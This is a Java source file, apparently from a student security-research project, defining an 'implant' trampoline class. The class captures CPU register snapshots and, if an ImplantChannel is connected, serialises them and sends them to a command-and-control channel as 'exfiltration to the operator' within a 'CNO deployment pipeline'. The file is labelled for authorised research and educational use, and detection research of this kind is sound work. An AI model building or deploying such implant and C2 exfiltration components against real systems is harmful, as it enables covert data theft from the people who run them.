package com.utece.student.llpdetection.instrumentation.implant;

import com.utece.student.llpdetection.instrumentation.InstrumentBinary;
import com.utece.student.llpdetection.instrumentation.Trampoline;

import java.nio.ByteBuffer;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Combined trampoline that performs register state capture and
 * optional C2 exfiltration in a single interception iteration.
 *
 * Extends Trampoline<Object> to integrate:
 * - Register capture via InstrumentBinary (RIP, RAX, RBX, RCX, RDX)
 * - State serialization to byte array
 * - Optional transmission via ImplantChannel
 *
 * This class is the bridge between the instrumentation framework
 * and the CNO deployment pipeline. Each run() iteration captures
 * a complete register snapshot and, if a channel is connected,
 * exfiltrates the snapshot to the operator.
 *
 * For authorized security research and educational use only.
 */
public class InstrumentedTrampoline extends Trampoline<Object> {

    private final InstrumentBinary instrumentBinary;
    private final ImplantChannel channel;
    private final Map<String, Long> capturedState;
    private int iterationCount;
    private final int maxIterations;

    /**
     * Create an instrumented trampoline with optional C2 channel.
     *
     * @param channel C2 channel for exfiltration (null for local-only capture)
     * @param maxIterations Maximum trampoline iterations before termination
     */
    public InstrumentedTrampoline(ImplantChannel channel, int maxIterations) {
        this.instrumentBinary = new InstrumentBinary();
        this.channel = channel;
        this.capturedState = new LinkedHashMap<>();
        this.iterationCount = 0;
        this.maxIterations = maxIterations;
    }

    /**
     * Create a local-only instrumented trampoline (no C2 channel).
     */
    public InstrumentedTrampoline(int maxIterations) {
        this(null, maxIterations);
    }

    @Override
    public Object get() {
        if (iterationCount >= maxIterations) {
            return capturedState;
        }
        return null;
    }

    @Override
    public Trampoline<Object> run() {
        iterationCount++;

        // Capture register state via native bridge
        if (InstrumentBinary.isNativeAvailable()) {
            capturedState.put("RIP_" + iterationCount, instrumentBinary.getRip());

            // Invoke full register dump
            instrumentBinary.invoke();
        }

        capturedState.put("iteration", (long) iterationCount);
        capturedState.put("timestamp", System.nanoTime());

        // Exfiltrate via C2 channel if connected
        if (channel != null && channel.isConnected()) {
            byte[] serialized = serializeState();
            channel.send(serialized);
        }

        return this;
    }

    @Override
    public String toString() {
        return String.format("InstrumentedTrampoline[iter=%d/%d, native=%s, c2=%s]",
                iterationCount, maxIterations,
                InstrumentBinary.isNativeAvailable(),
                channel != null && channel.isConnected());
    }

    /**
     * Get the captured register state map.
     */
    public Map<String, Long> getCapturedState() {
        return new LinkedHashMap<>(capturedState);
    }

    /**
     * Serialize the captured state to a byte array for transmission.
     */
    private byte[] serializeState() {
        StringBuilder sb = new StringBuilder();
        sb.append("--- Trampoline Capture ---\n");
        for (Map.Entry<String, Long> entry : capturedState.entrySet()) {
            sb.append(String.format("%-20s 0x%016X\n", entry.getKey() + ":", entry.getValue()));
        }
        sb.append("--- End Capture ---\n");
        return sb.toString().getBytes();
    }
}
